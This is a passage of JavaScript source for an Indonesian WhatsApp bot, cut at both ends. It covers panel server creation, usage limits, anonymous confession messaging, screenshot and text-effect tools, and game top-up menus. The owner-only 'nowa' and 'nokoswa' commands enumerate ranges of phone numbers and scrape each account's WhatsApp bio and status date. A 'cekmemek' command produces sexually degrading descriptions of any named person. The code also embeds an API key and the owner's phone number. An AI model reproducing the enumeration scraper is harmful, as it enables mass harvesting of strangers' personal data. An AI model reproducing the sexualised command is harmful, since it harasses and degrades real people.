• ᴊᴀɴɢᴀɴ ʀᴜsᴜʜ sᴇʀᴠᴇʀ ʟᴀɪɴ
• ᴄʀᴇᴀᴛ ᴘᴀɴᴇʟ sᴇᴄᴜᴋᴜᴘɴʏᴀ

GROUP OFICIAL
• https://chat.whatsapp.com/G7zBGPIRHPrKwR77jANGHY

OWNER
wa.me/+6288286326619
`
kyy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kyy.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case 'limit':{
reply('*Your Limit:* ' + (db.data.users[m.sender].limit))
}
break
case 'lirik': {
if (!args[0]) return reply("Judulnya?")
reply(mess.search)
let d = await fetchJson(`https://aemt.me/lirik?text=${args[0]}`)
kyy.sendMessage(m.chat, { text: d.result.lyrics }, { quoted: fcall })
}
break
case 'resetlimit': {
if (!isCreator) return reply(mess.owner)
let list = Object.entries(global.db.data.users)
	let lim = !args || !args[0] ? 100 : isNumber(args[0]) ? parseInt(args[0]) : 100
	lim = Math.max(1, lim)
	list.map(([user, data], i) => (Number(data.limit = lim)))
		kyy.sendMessage(m.chat, {text: `*Limit berhasil direset ${lim} / user*`}, { quoted: m })
		}
break

case 'addlimit': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply('Masukkan Jumlah Limit Yang Akan Diberi')
    let who
    if (m.isGroup) who = m.mentionedJid[0]
    else who = m.chat
    if (!who) throw reply('Tag Orangnya')
    let txt = text.replace('@' + who.split`@`[0], '').trim()
    if (isNaN(txt)) throw reply('Hanya Angka')
    let poin = parseInt(txt)
    let limit = poin
    if (limit < 1) throw reply('Minimal 1')
    let user = global.db.data.users
    user[who].limit += poin
    if (limit > 9999999) return reply('Jangan Banyak² Jir 😂') 
    kyy.sendMessage(m.chat, {text: `Selamat @${who.split`@`[0]}. Kamu Mendapatkan +${poin} Limit!`}, {quoted:m})
    }
break
case 'confess': case 'confes': case 'menfes': case 'menfess':{
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
kyy.menfes = kyy.menfes ? kyy.menfes : {}
roof = Object.values(kyy.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (roof) return reply("Kamu masih berada dalam sesi menfess")
if (m.isGroup) return reply('Fitur Khusus Di private chat!')
if (!text) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if (!text.includes('|')) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|6292818802718|Menfes nih\n`)
let [namaNya, nomorNya, pesanNya] = text.split`|`
if (nomorNya.startsWith('0')) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if(isNaN(nomorNya)) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
var yoi = `Hi ada menfess nih buat kamu\n\nDari : ${namaNya}\nPesan : ${pesanNya}\n\nSilahkan ketik ${prefix}balasmenfess -- Untuk menerima menfess/confess\nSilahkan ketik ${prefix}tolakmenfess -- Untuk menolak menfess/confess\n\n_Pesan ini di tulis oleh seseorang pengguna bot, bot hanya menyampaikan saja_`
let tod = await getBuffer('https://telegra.ph/file/c8fdfc8426f5f60b48cca.jpg') 
let id = m.sender
kyy.menfes[id] = {
id,
a: m.sender,
b: nomorNya + "@s.whatsapp.net",
state: 'WAITING'
}
 await kyy.sendMessage(nomorNya + '@s.whatsapp.net', {image: tod, caption:yoi }, {})
reply('Pesan berhasil dikirim ke nomor tujuan. Moga aja dibales coy')
}
break
case 'balasmenfess': case 'balasmenfes': {
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
let roof = Object.values(kyy.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
if (!roof) return reply("Belum ada sesi menfess");
let room = Object.values(kyy.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING');
if (!room) return reply("Tidak ada sesi menfess yang sedang menunggu");
let other = [room.a, room.b].find(user => user !== m.sender);
room.b = m.sender;
room.state = 'CHATTING';
kyy.menfes[room.id] = {...room};
await kyy.sendMessage(other, { 
  text: `_@${m.sender.split("@")[0]} telah menerima menfess kamu, sekarang kamu bisa chat lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`, 
  mentions: [m.sender]
});
kyy.sendMessage(m.chat, { 
  text: `_Menfess telah diterima, sekarang kamu bisa chatan lewat bot ini_\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess`
});
}
break
 case 'tolakmenfess': case 'tolakmenfes': {
roof = Object.values(kyy.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return reply("Belum ada sesi menfess")
let room = Object.values(kyy.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find = Object.values(kyy.menfes).find(menpes => menpes.state == 'WAITING')
kyy.sendMessage(other, {text: `_Uppsss... @${m.sender.split("@")[0]} Menolak menfess kamu_`, mentions: [m.sender]})
// await kyy.sendMessage(find.a, {text: `_Uppsss... @${find.b.split("@")[0]} Menolak menfess kamu_`,mentions: [find.b]})
reply("Menfess berhasil di tolak 🤚")
delete kyy.menfes[roof.id]
}
break
 case 'stopconfess': case 'stopmenfess': {
 //find = Object.values(kyy.menfes).find(menpes => menpes.state == 'WAITING')
find = Object.values(kyy.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!find) return reply("Belum ada sesi menfess")
const to = find.a == m.sender ? find.b : find.a
kyy.sendMessage(to, {text: `_Teman chat telah menghentikan menfess ini_`, mentions:[m.sender]})
await reply("ok")
delete kyy.menfes[find.id]
}
 break
case "ssweb": {
    let link = text; // Simpan link yang dikirim ke dalam variabel 'link'
    if (!link) return reply(`Contoh ${prefix + command} link`);
    if (!/^https?:\/\//.test(link)) return reply('Awali *URL* dengan http:// atau https://');
    if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')

    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: 'Silahkan pilih *option* di bawah ini'
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: wm
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        gifPlayback: true,
                        subtitle: ownername,
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Desktop","id":"${prefix}sswebdesktop ${link}"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Tablet","id":"${prefix}sswebtablet ${link}"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Phone","id":"${prefix}sswebphone ${link}"}`
                            }
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                                newsletterName: saluran,
                                newsletterJid: idsal,
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, {});

    await kyy.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break

case "sswebdesktop":{
if (!text) return reply(`Contoh ${prefix+command} link`)
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
reply(mess.wait)
let krt = await sswebDesktop(text)
kyy.sendMessage(from ,{ image: krt.result, caption: mess.success },{ quoted: m })
}
break

case "sswebtablet":{
if (!text) return reply(`Contoh ${prefix+command} link`)
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
reply(mess.wait)
let krt = await sswebTablet(text)
kyy.sendMessage(from ,{ image: krt.result, caption: mess.success },{ quoted: m })
}
break

case "sswebphone":{
if (!text) return reply(`Contoh ${prefix+command} link`)
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
reply(mess.wait)
let krt = await sswebPhone(text)
kyy.sendMessage(from ,{ image: krt.result, caption: mess.success },{ quoted: m })
}
break
case'blackpink':case'rainbow2':case'water_pipe':case'halloween':case'sketch':case'sircuit':case'discovery':case'metallic2':case'fiction':case'demon':case'transformer':case'berry':case'thunder':case'magma':case'3dstone':case'neon':case'glitch':case'harry_potter':case'embossed':case'broken':case'papercut':case'gradient':case'glossy':case'watercolor':case'multicolor':case'neon_devil':case'underwater':case'bear':case'wonderfulg':case'christmas':case'neon_light':case'snow':case'cloudsky':case'luxury2':case'gradient2':case'summer':case'writing':case'engraved':case'summery':case'3dglue':case'metaldark':case'neonlight':case'oscar':case'minion':case'holographic':case'purple':case'glossyb':case'deluxe2':case'glossyc':case'fabric':case'neonc':case'newyear':case'newyear2':case'metals':case'xmas':case'blood':case'darkg':case'joker':case'wicker':case'natural':case'firework':case'skeleton':case'balloon':case'balloon2':case'balloon3':case'balloon4':case'balloon5':case'balloon6':case'balloon7':case'steel':case'gloss':case'denim':case'decorate':case'decorate2':case'peridot':case'rock':case'glass':case'glass2':case'glass3':case'glass4':case'glass5':case'glass6':case'glass7':case'glass8':case'captain_as2':case'robot':case'equalizer':case'toxic':case'sparkling':case'sparkling2':case'sparkling3':case'sparkling4':case'sparkling5':case'sparkling6':case'sparkling7':case'decorative':case'chocolate':case'strawberry':case'koifish':case'bread':case'matrix':case'blood2':case'neonligth2':case'thunder2':case'3dbox':case'neon2':case'roadw':case'bokeh':case'gneon':case'advanced':case'dropwater':case'wall':case'chrismast':case'honey':case'drug':case'marble':case'marble2':case'ice':case'juice':case'rusty':case'abstra':case'biscuit':case'wood':case'scifi':case'metalr':case'purpleg':case'shiny': case'jewelry':case'jewelry2':case'jewelry3':case'jewelry4':case'jewelry5':case'jewelry6':case'jewelry7':case'jewelry8':case'metalh':case'golden':case'glitter':case'glitter2':case'glitter3':case'glitter4':case'glitter5':case'glitter6':case'glitter7':case'metale':case'carbon':case'candy':case'metalb':case'gemb':case'3dchrome':case'metalb2':case'metalg':
{
if (isBan) return reply('Lu di ban kocak awokwok') 
if (!text) return reply(`Gunakan dengan cara .neon *text*`)
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
kyy.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let texpro = await getBuffer(`https://api.zeeoneofc.my.id/api/textpro/${command}?text=${q}&apikey=junaa`)
try{
await kyy.sendMessage(m.chat, {image: texpro, caption: "Done kak"}, {quoted: m})
kyy.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
} catch (err){
reply(`error`) 
}
}
break
       case 'nowa': {
if (!isCreator) return reply(`Khusus Kyy Aja`)
if (!args[0]) return m.reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return m.reply('Salah Tuan Bukan Begitu Xixi')
m.reply('Wait Tuan Sedang Kami Proses⏳')
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await kyy.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await kyy.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
m.reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
case 'wanumber': case 'neednokos': case 'nokoswa':{
if (!isCreator) return reply(`Khusus Kyy Aja`)
if (!text) return reply(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        reply(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await kyy.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await kyy.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        reply(`${text66}${nobio}${nowhatsapp}`)
        }
break
 case'tozombie':{
 if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch(`https://aemt.me/converter/zombie?url=${url}`)
let data = await anu.json()
await kyy.sendMessage(m.chat, {image: {url: data.url}, caption: mess.done}, {quoted:m})
}
break
 case 'cekkhodam': {
 if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (!text) return m.reply("ketik nama lu anjg")
  
	const khodam = pickRandom([
	  "Kaleng Cat Avian",
	  "Pipa Rucika",
	  "Botol Tupperware",
	  "Badut Mixue",
	  "Sabun GIV",
	  "Sandal Swallow",
	  "Jarjit",
	  "Ijat",
	  "Fizi",
	  "Mail",
	  "Ehsan",
	  "Upin",
	  "Ipin",
	  "sungut lele",
	  "Tok Dalang",
	  "Opah",
	  "Opet",
	  "Alul",
	  "Pak Vinsen",
	  "Maman Resing",
	  "Pak RT",
	  "Admin ETI",
	  "Bung Towel",
	  "Lumpia Basah",
	  "Martabak Manis",
	  "Baso Tahu",
	  "Tahu Gejrot",
	  "Dimsum",
	  "Seblak Ceker",
	  "Telor Gulung",
	  "Tahu Aci",
	  "Tempe Mendoan",
	  "Nasi Kucing",
	  "Kue Cubit",
	  "Tahu Sumedang",
	  "Nasi Uduk",
	  "Wedang Ronde",
	  "Kerupuk Udang",
	  "Cilok",
	  "Cilung",
	  "Kue Sus",
	  "Jasuke",
	  "Seblak Makaroni",
	  "Sate Padang",
	  "Sayur Asem",
	  "Kromboloni",
	  "Marmut Pink",
	  "Belalang Mullet",
	  "Kucing Oren",
	  "Lintah Terbang",
	  "Singa Paddle Pop",
	  "Macan Cisewu",
	  "Vario Mber",
	  "Beat Mber",
	  "Supra Geter",
	  "Oli Samping",
	  "Knalpot Racing",
	  "Jus Stroberi",
	  "Jus Alpukat",
	  "Alpukat Kocok",
	  "Es Kopyor",
	  "Es Jeruk",
	  "Cappucino Cincau",
	  "Jasjus Melon",
	  "Teajus Apel",
	  "Pop ice Mangga",
	  "Teajus Gulabatu",
	  "Air Selokan",
	  "Air Kobokan",
	  "TV Tabung",
	  "Keran Air",
	  "Tutup Panci",
	  "Kotak Amal",
	  "Tutup Termos",
	  "Tutup Botol",
	  "Kresek Item",
	  "Kepala Casan",
	  "Ban Serep",
	  "Kursi Lipat",
	  "Kursi Goyang",
	  "Kulit Pisang",
	  "Warung Madura",
	  "Gorong-gorong",
	])
  
	const response = `
  ╭━━━━°「 *Cekkodam* 」°
┃
┊• *Nama :* ${text}
┃• *Khodam :* ${khodam}
╰═┅═━––––––๑
	  `
  
	m.reply(response)
  }
break
 case 'cekmemek': {
 if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (!text) return reply('Ketik Namanya Tolol!')
reply(`
╭━━━━°「 *Memek ${text}* 」°
┃
┊• Nama : ${text}
┃• memek : ${pickRandom(['ih item','Belang wkwk','Muluss','Putih Mulus','Black Doff','Pink wow','Item Glossy'])}
┊• lubang : ${pickRandom(['perawan','ga perawan','udah pernah dimasukin','masih rapet','tembem'])}
┃• jembut : ${pickRandom(['lebat','ada sedikit','gada jembut','tipis','muluss'])}
╰═┅═━––––––๑`)
}
break
 case 'namaninja': {    
 if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
reply(teks.replace(/[a-z]/gi, v => {
return {
'a': 'ka',
'b': 'tu',
'c': 'mi',
'd': 'te',
'e': 'ku',
'f': 'lu',
'g': 'ji',
'h': 'ri',
'i': 'ki',
'j': 'zu',
'k': 'me',
'l': 'ta',
'm': 'rin',
'n': 'to',
'o': 'mo',
'p': 'no',
'q': 'ke',
'r': 'shi',
's': 'ari',
't': 'ci',
'u': 'do',
'v': 'ru',
'w': 'mei',
'x': 'na',
'y': 'fu',
'z': 'zi'
}[v.toLowerCase()] || v
}))
}
break
 case 'caritemangc': 
case 'carikawangc': {
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (!m.isGroup) return reply(mess.group)
if (participants.length === 0) {
return reply('Tidak ada anggota di grup.');
}
const member = participants.map(u => u.id).filter(v => v !== kyy.user.jid);
if (member.length === 0) {
return reply('Tidak ada anggota non-bot di grup.');
}
const phoneNumber = member[Math.floor(Math.random() * member.length)];
const waLink = `https://wa.me/${phoneNumber.split("@")[0]}`;
await sleep(1000);
reply('Sedang mencari...');
await sleep(4000);
reply('Berhasil mendapatkan satu orang');
await sleep(3000);
kyy.sendMessage(m.chat, { text: `Nih Kak ${phoneNumber.split("@")[0]}\n\n${waLink}` }, m);
}
break
    case 'tiktokaudio': case 'ttsong': case 'ttmp3': {
if (!text) return reply( `Example : ${prefix + command} link`)
     if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
reply(`Tunggu sebentar ya kakak:>`)
require('./lib/tiktok').Tiktok(q).then( data => {
kyy.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
     case 'jodoh': {
            if (!m.isGroup) return m.reply('khusus grup oyy')
                 if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
kyy.sendMessage(m.chat,
{ text: `👩‍❤️‍👨 Jodohmu Adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./KyyMedia/image/kyy.jpg`),
"sourceUrl": `wa.me/+6288286326619`}}},
{ quoted: m})        
            }
            break
            case "darkjoke": case "darkjokes":
await loading()
 var ress = await Darkjokes()
teks = "*Darkjokes*"
kyy.sendMessage(m.chat, { image : { url : ress }, caption: teks }, { quoted:m })
            break
            case 'kobo': {
if (!isCreator) return reply('*Khusus Premium*')
if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (ChatBot) return reply('Sudah Aktif')
chatbot.push(from)
reply('Succes menyalakan kobo di group ini 🌷')
} else if (args[0] === "off") {
if (!ChatBot) return reply('Sudah Mati')
let off = ntilink.indexOf(from)
chatbot.splice(off, 1)
reply('Succes mematikan kobo di group ini 🌷')
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'topup': {
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: 'Silahkan pilih *option* di bawah ini'
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: wm
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        gifPlayback: true,
                        subtitle: ownername,
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Pubg","id":"${prefix}pubg"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Free Fire","id":"${prefix}ff"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Mobile Legend","id":"${prefix}ml"}`
                            }
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                                newsletterName: saluran,
                                newsletterJid: '12345678',
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, {});

    await kyy.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break
case 'ml': {
let sections = [{
title: 'Menu Sewa',
highlight_label: 'Recomended',
rows: [{
title: '36 Diamond',
description: `11K`, 
id: `.pembayarandm`
},
{
title: '44 Diamond',
description: "12k", 
id: `.pembayarandm`
},
{
title: '56 Diamond', 
description: "16k", 
id: `.pembayarandm`
},
{
title: '86 Diamond', 
description: "23K", 
id: `.pembayarandm`
},
{
title: '112 Diamond', 
description: "31K", 
id: `.pembayarandm`
},
{
title: '429 Diamond', 
description: "109K", 
id: `.pembayarandm`
},
{
title: '600 Diamons', 
description: "162K", 
id: `.pembayarandm`
}]
}]

let listMessage = {
    title: 'List Sewa', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '1234567890@newsletter',
 newsletterName: 'Powered By KyyDev', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: kyy.decodeJid(kyy.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Ayo Topup ml Skrng!!`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${sender.split("@")[0]} 👋*`,
 subtitle: "",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/9e9076678d390b21556e5.jpg" } }, { upload: kyy.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await kyy.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'ff': {
let sections = [{
title: 'Menu Sewa',
highlight_label: 'Recomended',
rows: [{
title: '70 Diamond',
description: `10K`, 
id: `.pembayarandm`
},
{
title: '100 Diamond',
description: "15k", 
id: `.pembayarandm`
},
{
title: '140 Diamond', 
description: "20k", 
id: `.pembayarandm`
},
{
title: '210 Diamond', 
description: "30k", 
id: `.pembayarandm`
},
{
title: '355 Diamond', 
description: "47K", 
id: `.pembayarandm`
},
{
title: '1000 Diamond', 
description: "131K", 
id: `.pembayarandm`
},
{
title: '1450 Diamons', 
description: "182K", 
id: `.pembayarandm`
}]
}]

let listMessage = {
    title: 'List Sewa', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '1234567890@newsletter',
 newsletterName: 'Powered By KyyDev', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: kyy.decodeJid(kyy.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: Styles(`Ayo Topup ff Skrng!!`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${sender.split("@")[0]} 👋*`,
 subtitle: "",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/9e9076678d390b21556e5.jpg" } }, { upload: kyy.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await kyy.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'pubg': {
let sections = [{
title: 'Menu Sewa',
highlight_label: 'Recomended',
rows: [{
title: '70 uc',
description: `21K`, 
